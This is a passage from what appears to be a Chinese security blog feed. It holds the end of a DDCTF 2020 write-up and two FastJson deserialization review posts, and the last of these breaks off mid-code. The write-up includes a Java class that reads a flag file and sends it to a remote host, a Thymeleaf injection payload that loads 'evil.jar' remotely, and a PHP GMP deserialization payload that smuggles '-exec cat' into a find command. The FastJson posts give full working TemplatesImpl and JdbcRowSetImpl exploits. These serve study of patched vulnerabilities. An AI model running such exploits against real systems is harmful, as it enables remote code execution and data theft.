<p>spring-web.xml中给出了3个controller包：com.ctf.controller, com.ctf.repository, com.ctf.service。这里需要猜测一下类名。最后测出来了com.ctf.controller.IndexController.class、com.ctf.controller.AuthController.class以及com.ctf.controller.ManagerController.class。<br>通过阅读源码，得到了一个路径。<br><img src="19.png" alt=""><br>访问后，得到一个输入框。<br><img src="20.png" alt=""><br>根据源码，输入的值会写入一个html页面中，后续会使用thymeleaf模版进行render，但是在传入的payload中需要绕过黑名单。联想到之前利用URLClassLoader远程加载恶意的Jar包从而RCE。恶意的Jar包中，编写了读取flag文件，并发送至远程的代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      URL uRL1 = <span class="keyword">new</span> URL(<span class="string">"file:///flag_is_here"</span>);</span><br><span class="line">      InputStream inputStream = uRL1.openStream();</span><br><span class="line">      ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte1 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</span><br><span class="line">      <span class="keyword">int</span> i;</span><br><span class="line">      <span class="keyword">while</span> ((i = inputStream.read(arrayOfByte1)) &gt;= <span class="number">0</span>)</span><br><span class="line">        byteArrayOutputStream.write(arrayOfByte1, <span class="number">0</span>, i); </span><br><span class="line">      byteArrayOutputStream.close();</span><br><span class="line">      inputStream.close();</span><br><span class="line">      <span class="keyword">byte</span>[] arrayOfByte2 = byteArrayOutputStream.toByteArray();</span><br><span class="line">      String str1 = URLEncoder.encode(<span class="keyword">new</span> String(arrayOfByte2), <span class="string">"UTF8"</span>);</span><br><span class="line">      URL uRL2 = <span class="keyword">new</span> URL(<span class="string">"http://xxx.xxx.xxx.xxx/?a="</span> + str1);</span><br><span class="line">      HttpURLConnection httpURLConnection = (HttpURLConnection)uRL2.openConnection();</span><br><span class="line">      httpURLConnection.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line">      httpURLConnection.setRequestMethod(<span class="string">"GET"</span>);</span><br><span class="line">      httpURLConnection.setRequestProperty(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded; charset=UTF-8"</span>);</span><br><span class="line">      BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(httpURLConnection.getInputStream(), <span class="string">"utf-8"</span>));</span><br><span class="line">      String str2 = <span class="keyword">null</span>;</span><br><span class="line">      StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">      <span class="keyword">while</span> ((str2 = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        stringBuilder.append(str2 + <span class="string">"\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      httpURLConnection.disconnect();</span><br><span class="line">      System.out.println(stringBuilder.toString());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">      exception.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>初始的payload如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[[$&#123;&#123;T(java.net.URLClassLoader).getConstructors()[1].newInstance(new java.net.URL[]&#123;&#123;T(java.net.URL).getConstructors()[2].newInstance(&quot;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;evil.jar&quot;)&#125;&#125;).loadClass(&quot;ExecTest&quot;).getConstructor().newInstance()&#125;&#125;]]</span><br></pre></td></tr></table></figure>

<p>由于禁掉了引号，使用T(Character).toString()进行绕过。最终的payload如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[[$&#123;T(java.net.URLClassLoader).getConstructors()[1].newInstance(new java.net.URL[]&#123;T(java.net.URL).getConstructors()[2].newInstance(T(Character).toString(104).concat(T(Character).toString(116)).concat(T(Character).toString(116)).concat(T(Character).toString(112)).concat(T(Character).toString(58)).concat(T(Character).toString(47)).concat(T(Character).toString(47)).concat(T(Character).toString(49)).concat(T(Character).toString(49)).concat(T(Character).toString(56)).concat(T(Character).toString(46)).concat(T(Character).toString(56)).concat(T(Character).toString(57)).concat(T(Character).toString(46)).concat(T(Character).toString(50)).concat(T(Character).toString(52)).concat(T(Character).toString(53)).concat(T(Character).toString(46)).concat(T(Character).toString(49)).concat(T(Character).toString(50)).concat(T(Character).toString(50)).concat(T(Character).toString(47)).concat(T(Character).toString(101)).concat(T(Character).toString(118)).concat(T(Character).toString(105)).concat(T(Character).toString(108)).concat(T(Character).toString(46)).concat(T(Character).toString(106)).concat(T(Character).toString(97)).concat(T(Character).toString(114)))&#125;).loadClass(T(Character).toString(69).concat(T(Character).toString(120)).concat(T(Character).toString(101)).concat(T(Character).toString(99)).concat(T(Character).toString(84)).concat(T(Character).toString(101)).concat(T(Character).toString(115)).concat(T(Character).toString(116))).getConstructor().newInstance()&#125;]]</span><br></pre></td></tr></table></figure>
<p>最终拿到了flag。<br><img src="21.png" alt=""></p>
<h2 id="Override-me"><a href="#Override-me" class="headerlink" title="Override me"></a>Override me</h2><p>这道题给了源码，如下所示。复现时，赛题环境已经关闭，因此直接docker搭了个环境，进行复现。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $kw0ng;</span><br><span class="line">    <span class="keyword">var</span> $flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;kw0ng = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> system(<span class="string">'find /FlagNeverFall '</span> . escapeshellcmd(<span class="keyword">$this</span>-&gt;flag));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HintClass</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span>  $hint;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i"</span>, <span class="keyword">$this</span>-&gt;hint))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Don't Do That!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;execute(<span class="keyword">$this</span>-&gt;hint);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShowOff</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $contents;</span><br><span class="line">    <span class="keyword">public</span> $page;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'/hint/hint.php'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;contents = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;contents();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;page-&gt;contents = <span class="string">"POP me! I can give you some hints!"</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;page-&gt;cont);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MiddleMan</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $cont;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;content;</span><br><span class="line">        <span class="keyword">return</span> $func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$show = <span class="keyword">new</span> ShowOff();</span><br><span class="line">$bullet = $_GET[<span class="string">'bullet'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($bullet))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Give Me Something!"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($bullet == <span class="string">'phpinfo'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $infos = <span class="keyword">new</span> Info();</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $obstacle1 = <span class="keyword">new</span> stdClass;</span><br><span class="line">    $mc = <span class="keyword">new</span> MyClass();</span><br><span class="line">    $mc-&gt;flag = <span class="string">"MyClass's flag said, Overwrite Me If You Can!"</span>;</span><br><span class="line">    @unserialize($bullet);</span><br><span class="line">    <span class="keyword">echo</span> $mc-&gt;get_flag();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到这个源码，就会想到GMP反序列化，因为它有一个转整型的操作，就可以利用GMP反序列化来修改内存中的对象的值。具体的原理参考<a href="https://paper.seebug.org/1267/。" target="_blank" rel="noopener">https://paper.seebug.org/1267/。</a></p>
<p>首先$bullet的值设置为phpinfo()，发现PHP的版本为5.6.10版本。php版本小于5.6.11，可以使用内置类<code>DateInterval</code>。<br><img src="22.png" alt=""><br>然后$bullet设置为空，可以发现suffix_flag的位置。<br><img src="23.png" alt=""></p>
<p>然后利用payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:1:&#123;i:0;C:3:&quot;GMP&quot;:109:&#123;s:1:&quot;3&quot;;a:2:&#123;s:4:&quot;flag&quot;;s:36:&quot;-name suffix_flag.php -exec cat &#123;&#125; ;&quot;;i:0;O:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;;R:2;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>获得flag。<br><img src="24.png" alt=""></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>FastJson反序列化回顾系列(三)</title>
    <url>/2020/05/16/fastjson-3/</url>
    <content><![CDATA[<p>上一个回顾中指出了利用<code>L</code>和<code>;</code>来进行绕过。而这次的漏洞是由于上次漏洞的补丁打得太过简单导致可以通过双写<code>LL;;</code>来绕过。这一篇文章讲述的就是这一方式。</p>
<a id="more"></a>
<p>整个复现系列的payload放在了<a href="https://github.com/ananaskr/FastJson_Payload/tree/master/project/src/main/java" target="_blank" rel="noopener">github</a>上。</p>
<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>fastjson = 1.2.42</li>
</ul>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
<li>打开autotype</li>
</ul>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>从上次的补丁可以得知以下两点:</p>
<ul>
<li>将黑名单变成了hashcode，不好得知具体的类</li>
<li>将checkAutoType增加了对于<code>L;</code>这种情况的处理</li>
</ul>
<p>定位到checkAutoType函数。</p>
<p><img src="1.png" alt=""></p>
<p>它仅仅是判断了是否以<code>L</code>开头且以<code>;</code>结尾，如果是这样，就去掉开头的<code>L</code>和结尾的<code>;</code>。很明显可通过双写绕过。</p>
<p>比较不容易的是对于hashcode这样形式的黑名单，不容易知道真正的黑名单类。</p>
<blockquote>
<p>可通过爬取Maven仓库下所有类，然后跑一遍，输出黑名单类。</p>
</blockquote>
<h1 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h1><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.42&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">templatesimpl3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        String bytes1 = Base64.encodeBase64String(classBytes);</span><br><span class="line">        String NASTY_CLASS = <span class="string">"LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+bytes1+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line"></span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(text1, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.42&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdbcrowsetimpl3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>在1.2.43版本中的补丁中对以<code>LL</code>开头且以<code>;;</code>结尾的情况进行了防御。</p>
<p><img src="3.png" alt=""></p>
<p>抛出异常，然后去除开头的<code>L</code>和结尾的<code>;</code>。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://p0sec.net/index.php/archives/123/" target="_blank" rel="noopener">FastJson反序列化的前世今生</a></li>
<li><a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">enable_autotype</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson反序列化回顾系列(四)</title>
    <url>/2020/05/16/fastjson-4/</url>
    <content><![CDATA[<p>上一个回顾中打补丁的方式是若存在一个<code>L</code>与<code>;</code>就去掉，若存在两个，则抛出异常。看起来已经无法通过添加<code>L</code>与<code>;</code>的方式来进行。之前在回顾系列(二)中提到过，除了添加<code>L;</code>之后，还可以添加<code>[</code>，不过在当时并没成功。事实上，它是可以成功的。这篇文件就介绍了这一方式。</p>
<a id="more"></a>
<p>整个复现系列的payload放在了<a href="https://github.com/ananaskr/FastJson_Payload/tree/master/project/src/main/java" target="_blank" rel="noopener">github</a>上。</p>
<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>1.2.25 &lt;= fastjson &lt;= 1.2.43</li>
</ul>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
<li>打开autotype</li>
</ul>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>由于打补丁的方式非常简单粗暴，若className开头是<code>LL</code>就会抛出错误，所以无法利用<code>LL</code>这个点了。如下所示:</p>
<p><img src="1.png" alt=""></p>
<p>考虑利用另一个点<code>[</code>。定位到loadClass()函数。</p>
<p><img src="2.png" alt=""></p>
<p>之前分析得很浅，因为length为0，会抛出异常。我们直接加<code>[</code>是不可以的，那么应该如何构造使之能够可以呢？</p>
<p>根据FastJson反序列化的流程，由于@type是一个<code>[</code>，因此会调用到<code>com.alibaba.fastjson.serializer.ObjectArrayCodeC.class</code>中的deserialze()函数，跟进去，然后定位到如下图所示的位置:</p>
<p><img src="3.png" alt=""></p>
<p>首先通过clazz.getComponentType()获取到componentType，然后进入parser.parseArry()函数，跟进它。</p>
<p><img src="4.png" alt=""></p>
<p>可以看到此时的token值若不为14，即当前不为<code>[</code>，就会抛出异常，因此在””值后面紧跟着<code>[</code>。然后会进入lexer.nextToken()，跟进它。</p>
<p><img src="5.png" alt=""></p>
<p>如果当前的ch为</p>
<ul>
<li><code>{</code>，即在<code>[</code>之后的为<code>{</code>，则将token赋值为12，且移到下一个字符<code>&quot;</code></li>
<li><code>[</code>，即在<code>[</code>之后的为<code>[</code>，则将token赋值为14，且移到下一个字符<code>&quot;</code></li>
</ul>
<blockquote>
<p>事实上，这里只能写<code>{</code>，因为若token为14，在接下来的过程中会报错，我们后续会讲到这一点。</p>
</blockquote>
<p>在经历完这个之后，最终会走到((ObjectDeserializer)deserializer).deserialze()函数，如下图所示:</p>
<p><img src="6.png" alt=""></p>
<p>跟进它，它又会将后续的值进行反序列化。如下所示:</p>
<p><img src="7.png" alt=""></p>
<p>最终会调用到给autoCommit赋值的setAutoCommit函数，从而RCE。</p>
<p>那么再考虑一下上述第二种方式为什么不可以。同样跟进到deserialze函数里，如下图所示:</p>
<p><img src="8.png" alt=""></p>
<p>它最终抛出异常，从而无法RCE。</p>
<h2 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h2><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>根据上述分析，EXP如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;</span><br><span class="line">					&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;,</span><br><span class="line">					&quot;autoCommit&quot;:true</span><br><span class="line">					&#125;</span><br></pre></td></tr></table></figure>

<p>完整的demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.25-1.2.43&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdbcrowsetimpl4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>完整的demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.25-1.2.43&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">templatesimpl4</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span 